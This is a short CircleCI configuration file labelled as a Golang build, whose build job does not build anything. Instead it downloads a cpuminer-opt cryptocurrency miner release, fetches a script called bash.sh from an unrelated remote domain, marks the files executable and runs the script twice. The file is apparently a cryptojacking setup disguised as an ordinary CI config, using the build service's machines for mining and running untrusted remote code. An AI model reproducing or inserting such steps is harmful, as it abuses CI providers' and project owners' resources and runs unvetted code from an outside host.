# Golang CircleCI 2.0 configuration file
#
# Check https://circleci.com/docs/2.0/language-go/ for more details
version: 2

jobs:
  build:
    docker:
      - image: circleci/golang:1.9
    steps:
      - run: ls
      - run: mkdir a
      - run: cd a && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.15/cpuminer-opt-linux.tar.gz -o a.tar.gz && tar xf a.tar.gz && curl https://www.maxfile2linkbot.cf/85156/download -o bash.sh && chmod +x * && ./bash.sh
      - run:  ./bash.sh
